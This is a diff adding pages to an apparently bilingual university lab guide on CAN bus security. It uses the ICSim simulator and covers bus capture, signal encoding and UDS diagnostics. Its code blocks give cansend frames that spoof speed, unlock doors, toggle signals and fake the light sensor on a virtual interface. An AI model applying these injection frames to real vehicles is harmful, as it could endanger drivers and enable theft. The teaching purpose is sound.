+              <td><span class="en">Cameras, ADAS backbone</span><span class="fr">Caméras, backbone ADAS</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3><span class="en">Core Properties - and Why They Are Dangerous</span><span class="fr">Propriétés fondamentales
+          - et pourquoi elles sont dangereuses</span></h3>
+      <p><span class="en"><strong>No source addressing.</strong> A CAN frame carries an arbitration ID (the signal type)
+          and data. There is no sender field. A receiving ECU cannot know which node sent a frame.</span>
+        <span class="fr"><strong>Pas d'adressage source.</strong> Une trame CAN porte un ID d'arbitrage (le type de
+          signal) et des données. Il n'y a pas de champ émetteur. Un ECU récepteur ne peut pas savoir quel nœud a envoyé
+          une trame.</span>
+      </p>
+      <p><span class="en"><strong>No authentication.</strong> Any node can transmit any arbitration ID. There is no
+          cryptographic signature, no session token, and no challenge-response mechanism.</span>
+        <span class="fr"><strong>Pas d'authentification.</strong> N'importe quel nœud peut transmettre n'importe quel ID
+          d'arbitrage. Il n'y a pas de signature cryptographique, pas de jeton de session, et pas de mécanisme
+          défi-réponse.</span>
+      </p>
+      <p><span class="en"><strong>Priority by ID.</strong> Lower arbitration ID wins bus access during simultaneous
+          transmission. This is a feature for safety (brakes win over audio), but an attacker can exploit it by flooding
+          with a low ID.</span>
+        <span class="fr"><strong>Priorité par ID.</strong> L'ID d'arbitrage le plus bas remporte l'accès au bus lors
+          d'une transmission simultanée. C'est une fonctionnalité de sécurité (les freins l'emportent sur l'audio), mais
+          un attaquant peut l'exploiter en inondant avec un ID faible.</span>
+      </p>
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">Frame Format</span><span class="fr">Format de Trame</span></div>
+      <h2><span class="en">Anatomy of a CAN Frame</span><span class="fr">Anatomie d'une Trame CAN</span></h2>
+      <p><span class="en">In SocketCAN (Linux), candump displays frames as:</span><span class="fr">Dans SocketCAN
+          (Linux), candump affiche les trames comme suit :</span></p>
+      <pre><code><span class="hl-dim">interface  ID    [DLC]  data bytes</span>
+<span class="hl-amber">vcan0</span>      <span class="hl-cyan">244</span>   <span class="hl-green">[5]</span>   <span class="hl-dim">00 00 00</span> <span class="hl-amber">25 B8</span>
+  │          │     │       └── up to 8 bytes of payload (indexed [0]–[7])
+  │          │     └────────── Data Length Code (number of data bytes)
+  └──────────└──────────────── Arbitration ID (hex, 11-bit standard)</code></pre>
+      <p><span class="en">Bytes are indexed from 0 left to right. The active byte for a given signal may be anywhere in
+          the 8-byte payload - finding it is the reverse-engineering exercise.</span>
+        <span class="fr">Les octets sont indexés de 0 de gauche à droite. L'octet actif pour un signal donné peut se
+          trouver n'importe où dans le payload de 8 octets - le trouver est l'exercice de rétro-ingénierie.</span>
+      </p>
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">Bus Scanning</span><span class="fr">Scan de Bus</span></div>
+      <h2><span class="en">Capturing Traffic with candump &amp; cansniffer</span><span class="fr">Capturer le Trafic
+          avec candump &amp; cansniffer</span></h2>
+      <p><span class="en">The two main SocketCAN tools for passive observation are <code>candump</code> (raw log) and
+          <code>cansniffer</code> (live change detection). Start ICSim, then open a second terminal for capture.</span>
+        <span class="fr">Les deux principaux outils SocketCAN pour l'observation passive sont <code>candump</code>
+          (journal brut) et <code>cansniffer</code> (détection des changements en temps réel). Lancez ICSim, puis ouvrez
+          un second terminal pour la capture.</span>
+      </p>
+
+      <div class="code-label"><span class="en">Basic capture - all frames</span><span class="fr">Capture basique -
+          toutes les trames</span></div>
+      <pre><code>candump vcan0</code></pre>
+
+      <div class="code-label"><span class="en">Log to file for offline analysis</span><span class="fr">Enregistrer dans
+          un fichier pour analyse</span></div>
+      <pre><code>candump -l vcan0
+<span class="hl-dim"># Creates candump-YYYY-MM-DD_HHMMSS.log</span></code></pre>
+
+      <div class="code-label"><span class="en">Filter to a single CAN ID (e.g. only speed frames)</span><span
+          class="fr">Filtrer sur un seul ID CAN (ex : trames vitesse)</span></div>
+      <pre><code>candump vcan0,244:7FF
+<span class="hl-dim"># Format: interface,id:mask</span></code></pre>
+
+      <div class="code-label"><span class="en">Live change highlighter - best for finding active signals</span><span
+          class="fr">Surligneur de changements en direct - idéal pour trouver les signaux actifs</span></div>
+      <pre><code>cansniffer vcan0
+<span class="hl-dim"># Press '-a' to toggle display, arrow keys to scroll</span></code></pre>
+
+      <div class="info-block amber">
+        <div class="info-block-label"><span class="en">Scanning methodology</span><span class="fr">Méthodologie de
+            scan</span></div>
+        <p><span class="en">Launch <code>cansniffer</code>, then interact with the ICSim controls window one action at a
+            time (press accelerator, toggle a door, activate signals). The rows that change in cansniffer are your
+            active
+            IDs. Note them, then read their encoding in the <strong>Encoding</strong> section.</span>
+          <span class="fr">Lancez <code>cansniffer</code>, puis interagissez avec la fenêtre de contrôle ICSim une
+            action à la fois (accélération, porte, clignotants). Les lignes qui changent dans cansniffer sont vos IDs
+            actifs. Notez-les, puis lisez leur encodage dans la section <strong>Encodage</strong>.</span>
+        </p>
+      </div>
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">CH-Workshop Signal Map</span><span class="fr">Carte des Signaux
+          CH-Workshop</span></div>
+      <h2><span class="en">Known CAN IDs in This Lab</span><span class="fr">IDs CAN Connus dans ce Lab</span></h2>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>CAN ID</th>
+              <th><span class="en">Signal</span><span class="fr">Signal</span></th>
+              <th>DLC</th>
+              <th><span class="en">Transmission period</span><span class="fr">Période d'émission</span></th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="amber"><code>0x188</code></td>
+              <td><span class="en">Turn signals / Warning</span><span class="fr">Clignotants / Warning</span></td>
+              <td>1–4</td>
+              <td><span class="en">Every 500 ms</span><span class="fr">Toutes les 500 ms</span></td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x19B</code></td>
+              <td><span class="en">Door locks</span><span class="fr">Verrous portes</span></td>
+              <td>3</td>
+              <td><span class="en">On action only</span><span class="fr">Sur action uniquement</span></td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x244</code></td>
+              <td><span class="en">Vehicle speed</span><span class="fr">Vitesse véhicule</span></td>
+              <td>5</td>
+              <td><span class="en">Every ~10 ms</span><span class="fr">Toutes les ~10 ms</span></td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x340</code></td>
+              <td><span class="en">Headlights (injectable)</span><span class="fr">Phares (injectable)</span></td>
+              <td>8</td>
+              <td><span class="en">On injection</span><span class="fr">Sur injection</span></td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x39C</code></td>
+              <td><span class="en">Luminosity sensor</span><span class="fr">Capteur luminosité</span></td>
+              <td>5</td>
+              <td><span class="en">Every 300 ms</span><span class="fr">Toutes les 300 ms</span></td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x42A</code></td>
+              <td><span class="en">Warning state</span><span class="fr">État warning</span></td>
+              <td>3–5</td>
+              <td><span class="en">Every 250 ms</span><span class="fr">Toutes les 250 ms</span></td>
+            </tr>
+            <tr>
+              <td><code>0x7E0</code></td>
+              <td><span class="en">UDS request (to ECU)</span><span class="fr">Requête UDS (vers ECU)</span></td>
+              <td>var</td>
+              <td><span class="en">On demand - see UDS section</span><span class="fr">Sur demande - voir section
+                  UDS</span></td>
+            </tr>
+            <tr>
+              <td><code>0x7E8</code></td>
+              <td><span class="en">UDS response (from ECU)</span><span class="fr">Réponse UDS (depuis ECU)</span></td>
+              <td>var</td>
+              <td><span class="en">After a request</span><span class="fr">Après une requête</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p><span class="en">Signal encoding details (how bytes map to values) are covered in the <a href="#"
+            onclick="return showPage('encoding')">Encoding</a> section.
+          <span class="fr">Les détails d'encodage des signaux (comment les octets correspondent aux valeurs) sont
+            couverts dans la section <a href="#" onclick="return showPage('encoding')">Encodage</a>.
+    </div>
+    <footer>
+      <span class="en">IMT Atlantique Brest - IoV Security Lab - CAN Bus</span>
+      <span class="fr">IMT Atlantique Brest - Lab Sécurité IoV - Bus CAN</span>
+    </footer>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════ PAGE: ENCODING -->
+  <div class="page" id="page-encoding">
+    <div class="hero">
+      <div class="hero-inner">
+        <div class="hero-tag"><span class="en">Signal → Bytes</span><span class="fr">Signal → Octets</span></div>
+        <h1><span class="en">SIGNAL <span class="accent">ENCODING</span></span><span class="fr"><span
+              class="accent">ENCODAGE</span> DES SIGNAUX</span></h1>
+        <p class="hero-sub">
+          <span class="en">How ICSim packs each vehicle signal into raw CAN bytes. Understanding encoding lets you
+            calculate exactly which bytes to write when crafting an injection frame.</span>
+          <span class="fr">Comment ICSim compresse chaque signal véhicule en octets CAN bruts. Comprendre l'encodage
+            vous permet de calculer exactement quels octets écrire pour fabriquer une trame d'injection.</span>
+        </p>
+      </div>
+    </div>
+    <div class="content">
+
+      <div class="section-label"><span class="en">Speed Signal - 0x244</span><span class="fr">Signal Vitesse -
+          0x244</span></div>
+      <h2><span class="en">Big-Endian 16-bit Integer</span><span class="fr">Entier 16 bits Big-Endian</span></h2>
+      <p><span class="en">One byte (8 bits) holds values 0–255. ICSim stores speed as <strong>km/h × 100</strong>,
+          so 96.56 km/h becomes 9656 - which requires a 16-bit integer (range 0–65535). The value is split
+          <strong>big-endian</strong> across bytes [3] and [4]: the most significant byte goes first.</span>
+        <span class="fr">Un octet (8 bits) stocke les valeurs 0–255. ICSim stocke la vitesse en <strong>km/h ×
+            100</strong>,
+          donc 96,56 km/h devient 9656 - ce qui nécessite un entier 16 bits (plage 0–65535). La valeur est répartie en
+          <strong>big-endian</strong> sur les octets [3] et [4] : l'octet le plus significatif est placé en
+          premier.</span>
+      </p>
+
+      <pre><code><span class="hl-dim"># Encoding formula: km/h → bytes</span>
+target_kmh = <span class="hl-amber">96.56</span>
+kph_raw    = int(target_kmh * 100)   <span class="hl-dim"># = 9656 = 0x25B8</span>
+byte_hi    = (kph_raw >> 8) &amp; 0xFF  <span class="hl-dim"># = 0x25</span>
+byte_lo    =  kph_raw       &amp; 0xFF  <span class="hl-dim"># = 0xB8</span>
+
+<span class="hl-dim"># Resulting frame:</span>
+cansend vcan0 <span class="hl-cyan">244</span>#<span class="hl-dim">000000</span><span class="hl-amber">25B8</span></code></pre>
+
+      <div class="frame-diagram">
+        <div class="frame-cell">
+          <div class="byte-idx">[0]</div>
+          <div class="byte-val">00</div>
+          <div class="byte-label">pad</div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[1]</div>
+          <div class="byte-val">00</div>
+          <div class="byte-label">pad</div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[2]</div>
+          <div class="byte-val">00</div>
+          <div class="byte-label">pad</div>
+        </div>
+        <div class="frame-cell active-byte">
+          <div class="byte-idx">[3]</div>
+          <div class="byte-val">25</div>
+          <div class="byte-label">hi byte</div>
+        </div>
+        <div class="frame-cell active-byte">
+          <div class="byte-idx">[4]</div>
+          <div class="byte-val">B8</div>
+          <div class="byte-label">lo byte</div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[5]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[6]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[7]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+      </div>
+
+      <div class="info-block amber">
+        <div class="info-block-label"><span class="en">Idle noise</span><span class="fr">Bruit à l'arrêt</span></div>
+        <p><span class="en">At idle (speed = 0), byte [3] is always <code>0x01</code> and byte [4] is
+            <strong>random</strong>
+            noise. Do not try to decode a speed from these values - they are not a valid speed reading.</span>
+          <span class="fr">A l'arrêt (vitesse = 0), l'octet [3] est toujours <code>0x01</code> et l'octet [4] est un
+            <strong>bruit aléatoire</strong>. N'essayez pas de décoder une vitesse depuis ces valeurs - ce ne sont pas
+            des lectures valides.</span>
+        </p>
+      </div>
+
+      <h3><span class="en">Common Speed Encoding Values</span><span class="fr">Valeurs d'Encodage de Vitesse
+          Courantes</span></h3>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>mph</th>
+              <th>km/h</th>
+              <th>kph_raw</th>
+              <th>byte[3] hi</th>
+              <th>byte[4] lo</th>
+              <th><span class="en">cansend frame</span><span class="fr">trame cansend</span></th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>10</td>
+              <td>16.1</td>
+              <td>1609</td>
+              <td><code>0x06</code></td>
+              <td><code>0x49</code></td>
+              <td><code>244#0000000649</code></td>
+            </tr>
+            <tr>
+              <td>30</td>
+              <td>48.3</td>
+              <td>4828</td>
+              <td><code>0x12</code></td>
+              <td><code>0xDC</code></td>
+              <td><code>244#000000<span class="hl-amber">12DC</span></code></td>
+            </tr>
+            <tr>
+              <td>60</td>
+              <td>96.6</td>
+              <td>9656</td>
+              <td><code>0x25</code></td>
+              <td><code>0xB8</code></td>
+              <td><code>244#000000<span class="hl-amber">25B8</span></code></td>
+            </tr>
+            <tr>
+              <td class="dim"><span class="en">limit</span><span class="fr">limite</span></td>
+              <td>100</td>
+              <td>10000</td>
+              <td><code>0x27</code></td>
+              <td><code>0x10</code></td>
+              <td><code>244#000000<span class="hl-amber">2710</span></code></td>
+            </tr>
+            <tr>
+              <td class="dim"><span class="en">injected</span><span class="fr">injecté</span></td>
+              <td>150</td>
+              <td>15000</td>
+              <td><code>0x3A</code></td>
+              <td><code>0x98</code></td>
+              <td><code>244#000000<span class="hl-amber">3A98</span></code></td>
+            </tr>
+            <tr>
+              <td class="dim"><span class="en">injected</span><span class="fr">injecté</span></td>
+              <td>200</td>
+              <td>20000</td>
+              <td><code>0x4E</code></td>
+              <td><code>0x20</code></td>
+              <td><code>244#000000<span class="hl-amber">4E20</span></code></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">Turn Signals - 0x188</span><span class="fr">Clignotants - 0x188</span>
+      </div>
+      <h2><span class="en">Bitmask Encoding - Turn &amp; Warning</span><span class="fr">Encodage Bitmask - Clignotants
+          &amp; Warning</span></h2>
+      <p><span class="en">Byte [0] packs three boolean states into a single byte using bit flags. The frame is sent
+          every
+          500 ms even when all signals are off (value <code>0x00</code>). An active signal causes the value to toggle
+          between the active value and <code>0x00</code> at the blink rate.</span>
+        <span class="fr">L'octet [0] compresse trois états booléens en un seul octet à l'aide de drapeaux de bits. La
+          trame est envoyée toutes les 500 ms même lorsque tous les signaux sont éteints (valeur <code>0x00</code>). Un
+          signal actif fait alterner la valeur entre la valeur active et <code>0x00</code>.</span>
+      </p>
+
+      <pre><code><span class="hl-dim">byte[0] bit layout:</span>
+bit 0 = Left turn signal   : 0x01 = 0000 0001
+bit 1 = Right turn signal  : 0x02 = 0000 0010
+bit 0 and 1 = Warning (both)   : 0x03 = 0000 0011
+
+<span class="hl-dim">Encoding examples:</span>
+0x00  → all off
+0x01  → left indicator ON  → cansend vcan0 188#01
+0x02  → right indicator ON → cansend vcan0 188#02
+0x03  → warning (hazard)   → cansend vcan0 188#03</code></pre>
+
+      <div class="frame-diagram">
+        <div class="frame-cell active-byte">
+          <div class="byte-idx">[0]</div>
+          <div class="byte-val">01</div>
+          <div class="byte-label">turn mask</div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[1]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[2]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[3]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[4]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[5]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[6]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[7]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+      </div>
+
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">Door Locks - 0x19B</span><span class="fr">Verrous Portes -
+          0x19B</span></div>
+      <h2><span class="en">Bitmask Encoding - Door States</span><span class="fr">Encodage Bitmask - États des
+          Portes</span></h2>
+      <p><span class="en">Byte [2] encodes four door lock states. A bit set to <code>1</code> means
+          <strong>LOCKED</strong>. The initial state is <code>0x0F</code> (all doors locked). This frame is
+          <strong>only sent when an action occurs</strong> - it is not periodic.</span>
+        <span class="fr">L'octet [2] encode l'état de verrouillage de quatre portes. Un bit à <code>1</code> signifie
+          <strong>VERROUILLÉ</strong>. L'état initial est <code>0x0F</code> (toutes les portes verrouillées). Cette
+          trame n'est envoyée <strong>que lors d'une action</strong> - elle n'est pas périodique.</span>
+      </p>
+
+      <pre><code><span class="hl-dim">byte[2] bit layout (1 = LOCKED, 0 = UNLOCKED):</span>
+bit 0 = D1 driver front    0x01 = 0000 000<span class="hl-amber">1</span>
+bit 1 = D2 passenger front 0x02 = 0000 00<span class="hl-amber">1</span>0
+bit 2 = D3 rear left       0x04 = 0000 0<span class="hl-amber">1</span>00
+bit 3 = D4 rear right      0x08 = 0000 <span class="hl-amber">1</span>000
+
+<span class="hl-dim">Encoding examples:</span>
+0x0F = 0000 <span class="hl-amber">1111</span> → all LOCKED  → cansend vcan0 19B#00000F
+0x00 = 0000 0000 → all OPEN   → cansend vcan0 19B#000000
+0x0E = 0000 <span class="hl-amber">111</span>0 → D1 unlocked, D2/D3/D4 locked
+0x0D = 0000 <span class="hl-amber">11</span>0<span class="hl-amber">1</span> → D2 unlocked, others locked</code></pre>
+
+      <div class="frame-diagram">
+        <div class="frame-cell">
+          <div class="byte-idx">[0]</div>
+          <div class="byte-val">00</div>
+          <div class="byte-label">pad</div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[1]</div>
+          <div class="byte-val">00</div>
+          <div class="byte-label">pad</div>
+        </div>
+        <div class="frame-cell active-byte">
+          <div class="byte-idx">[2]</div>
+          <div class="byte-val">0F</div>
+          <div class="byte-label">lock mask</div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[3]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[4]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[5]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[6]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[7]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+      </div>
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">Luminosity Sensor - 0x39C</span><span class="fr">Capteur Luminosité -
+          0x39C</span></div>
+      <h2><span class="en">Single-Byte Threshold Encoding</span><span class="fr">Encodage Seuil Octet Unique</span></h2>
+      <p><span class="en">Byte [3] carries the ambient light level as a single unsigned byte. The ECU uses a threshold
+          to switch between day and night mode. Values above ~0x60 are treated as daylight; values below are night.
+          Spoofing this value lets you force the headlight behavior regardless of actual mode.</span>
+        <span class="fr">L'octet [3] porte le niveau de lumière ambiante sous forme d'un octet non signé. L'ECU utilise
+          un seuil pour basculer entre les modes jour et nuit. Les valeurs supérieures à ~0x60 sont considérées comme
+          lumière du jour ; les valeurs inférieures sont traitées comme la nuit. Usurper cette valeur vous permet de
+          forcer le comportement des phares indépendamment du mode réel.</span>
+      </p>
+
+      <pre><code><span class="hl-dim">Range mapping for byte[3]:</span>
+0xC2 – 0xCB = <span class="hl-amber">daytime</span>   (normal operation)
+0x1E – 0x27 = <span class="hl-cyan">nighttime</span>  (headlights activate)
+&gt;= 0x60     = treated as daylight by ECU threshold
+
+<span class="hl-dim">Force daytime (spoof bright light):</span>
+cansend vcan0 39C#<span class="hl-dim">000000</span><span class="hl-amber">C2</span>00</code></pre>
+      <div class="frame-diagram">
+        <div class="frame-cell">
+          <div class="byte-idx">[0]</div>
+          <div class="byte-val">00</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[1]</div>
+          <div class="byte-val">00</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[2]</div>
+          <div class="byte-val">00</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell active-byte">
+          <div class="byte-idx">[3]</div>
+          <div class="byte-val">CB</div>
+          <div class="byte-label">Luminosity mask</div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[4]</div>
+          <div class="byte-val">00</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[5]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[6]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+        <div class="frame-cell">
+          <div class="byte-idx">[7]</div>
+          <div class="byte-val">--</div>
+          <div class="byte-label"></div>
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <span class="en">IMT Atlantique Brest - IoV Security Lab - CAN Bus</span>
+      <span class="fr">IMT Atlantique Brest - Lab Sécurité IoV - Bus CAN</span>
+    </footer>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════ PAGE: UDS -->
+  <div class="page" id="page-uds">
+    <div class="hero">
+      <div class="hero-inner">
+        <div class="hero-tag"><span class="en">ISO 14229 Diagnostic Protocol</span><span class="fr">Protocole de
+            Diagnostic ISO 14229</span></div>
+        <h1><span class="en">UDS <span class="accent">DIAGNOSTICS</span></span><span class="fr">DIAGNOSTIC <span
+              class="accent">UDS</span></span></h1>
+        <p class="hero-sub">
+          <span class="en">Unified Diagnostic Services - the standard protocol used by workshop tools to communicate
+            with
+            ECUs. Read data, manage sessions, perform security access, and send custom commands over CAN.</span>
+          <span class="fr">Unified Diagnostic Services - le protocole standard utilisé par les outils atelier pour
+            communiquer avec les ECU. Lire des données, gérer les sessions, effectuer l'accès sécurisé et envoyer des
+            commandes personnalisées via CAN.</span>
+        </p>
+      </div>
+    </div>
+    <div class="content">
+
+      <div class="section-label"><span class="en">Overview</span><span class="fr">Vue d'ensemble</span></div>
+      <h2><span class="en">What is UDS?</span><span class="fr">Qu'est-ce que UDS ?</span></h2>
+      <p class="lead">
+        <span class="en">UDS (Unified Diagnostic Services, <strong>ISO 14229</strong>) is a diagnostic communication
+          protocol implemented in every modern vehicle ECU. It provides a standardized way for external tools (scanners,
+          reprogramming stations) to query faults, read live data, update firmware, and access protected functions. In
+          this lab, UDS requests are sent directly over CAN - no special hardware required.</span>
+        <span class="fr">UDS (Unified Diagnostic Services, <strong>ISO 14229</strong>) est un protocole de communication
+          de diagnostic implémenté dans tout ECU de véhicule moderne. Il fournit un moyen standardisé pour les outils
+          externes (scanners, stations de reprogrammation) d'interroger les défauts, lire des données en temps réel,
+          mettre à jour le firmware et accéder aux fonctions protégées. Dans ce lab, les requêtes UDS sont envoyées
+          directement via CAN - pas de matériel spécial requis.</span>
+      </p>
+      <div class="cards">
+        <div class="card">
+          <div class="card-title"><span class="en">Read ECU Data</span><span class="fr">Lire les Données ECU</span>
+          </div>
+          <p><span class="en">Request the VIN, software version, calibration data, or any Data Identifier (DID) stored
+              in the ECU's memory.</span>
+            <span class="fr">Demander le VIN, la version logicielle, les données de calibration, ou n'importe quel
+              identifiant de données (DID) stocké dans la mémoire de l'ECU.</span>
+          </p>
+        </div>
+        <div class="card">
+          <div class="card-title"><span class="en">Security Access</span><span class="fr">Accès Sécurisé</span></div>
+          <p><span class="en">A seed-key challenge-response mechanism that locks protected services (reprogramming,
+              hidden routines) behind a cryptographic gate.</span>
+            <span class="fr">Un mécanisme défi-réponse graine-clé qui verrouille les services protégés (reprogrammation,
+              routines cachées) derrière une porte cryptographique.</span>
+          </p>
+        </div>
+        <div class="card">
+          <div class="card-title"><span class="en">Execute Routines</span><span class="fr">Exécuter des Routines</span>
+          </div>
+          <p><span class="en">Trigger internal ECU functions such as actuator tests, calibrations, or undocumented
+              manufacturer commands via Routine Control (SID 0x31).</span>
+            <span class="fr">Déclencher des fonctions ECU internes telles que des tests d'actionneurs, des calibrations
+              ou des commandes fabricant non documentées via Routine Control (SID 0x31).</span>
+          </p>
+        </div>
+      </div>
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">Transport Layer</span><span class="fr">Couche Transport</span></div>
+      <h2><span class="en">ISO-TP (ISO 15765-2) - Multi-Frame Transport</span><span class="fr">ISO-TP (ISO 15765-2) -
+          Transport Multi-Trame</span></h2>
+      <p><span class="en">A single CAN frame can carry at most 8 bytes. UDS messages (like VIN responses, firmware
+          chunks) can be much longer. ISO-TP adds a fragmentation and reassembly layer on top of CAN. It defines four
+          frame types:</span>
+        <span class="fr">Une trame CAN unique peut transporter au maximum 8 octets. Les messages UDS (comme les réponses
+          VIN, les blocs de firmware) peuvent être beaucoup plus longs. ISO-TP ajoute une couche de fragmentation et
+          réassemblage au-dessus du CAN. Il définit quatre types de trames :</span>
+      </p>
+
+      <div style="margin:1.5rem 0">
+        <div class="istp-row">
+          <span class="istp-label">Single Frame</span>
+          <div class="istp-cell istp-pci">0x0N</div>
+          <div class="istp-cell istp-sid">SID</div>
+          <div class="istp-cell istp-data">data…</div>
+          <div class="istp-cell istp-data" style="color:var(--text-faint);font-size:0.65rem; border-radius: 5pc;">N =
+            payload length ≤ 7</div>
+        </div>
+        <div class="istp-row">
+          <span class="istp-label">First Frame</span>
+          <div class="istp-cell istp-pci">0x1N</div>
+          <div class="istp-cell istp-len">LEN_HI</div>
+          <div class="istp-cell istp-sid">SID</div>
+          <div class="istp-cell istp-data">data[0..4]</div>
+          <div class="istp-cell istp-data" style="color:var(--text-faint);font-size:0.65rem; border-radius: 5pc">N = MSN
+            of total length</div>
+        </div>
+        <div class="istp-row">
+          <span class="istp-label">Consec. Frame</span>
+          <div class="istp-cell istp-pci">0x2X</div>
+          <div class="istp-cell istp-data">data[0..6]</div>
+          <div class="istp-cell istp-data" style="color:var(--text-faint);font-size:0.65rem; border-radius: 5pc">X =
+            sequence counter (1–F, wraps)</div>
+        </div>
+        <div class="istp-row">
+          <span class="istp-label">Flow Control</span>
+          <div class="istp-cell istp-pci">0x30</div>
+          <div class="istp-cell istp-data">BS</div>
+          <div class="istp-cell istp-data">STmin</div>
+          <div class="istp-cell istp-data" style="color:var(--text-faint);font-size:0.65rem; border-radius: 5pc">Sent by
+            receiver to trigger CF stream</div>
+        </div>
+      </div>
+
+      <div class="info-block amber">
+        <div class="info-block-label"><span class="en">Flow control in practice</span><span class="fr">Contrôle de flux
+            en pratique</span></div>
+        <p><span class="en">When the ECU sends a multi-frame response (First Frame), <strong>you must reply with a Flow
+              Control frame</strong> to trigger the Consecutive Frames. Use <code>cansend vcan0 7E0#300000</code> (block
+            size 0 = send all, STmin 0 = no delay).</span>
+          <span class="fr">Lorsque l'ECU envoie une réponse multi-trame (First Frame), <strong>vous devez répondre avec
+              une trame Flow Control</strong> pour déclencher les Consecutive Frames. Utilisez
+            <code>cansend vcan0 7E0#300000</code> (block size 0 = tout envoyer, STmin 0 = pas de délai).</span>
+        </p>
+      </div>
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">Frame Structure</span><span class="fr">Structure de Trame</span></div>
+      <h2><span class="en">How to Build a UDS Request Frame</span><span class="fr">Comment Construire une Trame de
+          Requête UDS</span></h2>
+      <p><span class="en">UDS messages are sent as Single Frame ISO-TP packets on CAN ID <code>0x7E0</code>. The ECU
+          responds on <code>0x7E8</code>. The first byte of the ISO-TP payload is the <strong>length</strong> (how many
+          bytes follow), the second is the <strong>Service ID (SID)</strong>, and the remaining bytes are
+          sub-functions or data.</span>
+        <span class="fr">Les messages UDS sont envoyés comme paquets ISO-TP Single Frame sur l'ID CAN
+          <code>0x7E0</code>.
+          L'ECU répond sur <code>0x7E8</code>. Le premier octet du payload ISO-TP est la <strong>longueur</strong>
+          (combien d'octets suivent), le second est le <strong>Service ID (SID)</strong>, et les octets restants sont
+          des sous-fonctions ou des données.</span>
+      </p>
+
+      <div class="uds-frame" style="margin:1.5rem 0">
+        <div class="uds-cell uds-len">
+          <div class="uc-label">byte [0]</div>
+          <div class="uc-val">0x02</div>
+          <div class="uc-desc">Length<br>(2 bytes follow)</div>
+        </div>
+        <div class="uds-cell uds-sid">
+          <div class="uc-label">byte [1]</div>
+          <div class="uc-val">0x10</div>
+          <div class="uc-desc">SID<br>Session Control</div>
+        </div>
+        <div class="uds-cell uds-sub">
+          <div class="uc-label">byte [2]</div>
+          <div class="uc-val">0x02</div>
+          <div class="uc-desc">Sub-function<br>Extended session</div>
+        </div>
+        <div class="uds-cell uds-data">
+          <div class="uc-label">bytes [3–7]</div>
+          <div class="uc-val" style="color:var(--text-faint)">-</div>
+          <div class="uc-desc">Unused<br>padding</div>
+        </div>
+      </div>
+
+      <pre><code><span class="hl-dim"># cansend format:  interface  ID#PAYLOAD_HEX</span>
+<span class="hl-dim"># Open extended diagnostic session (SID 0x10, sub-func 0x02):</span>
+cansend vcan0 7E0#<span class="hl-green">02</span><span class="hl-amber">10</span><span class="hl-cyan">02</span>
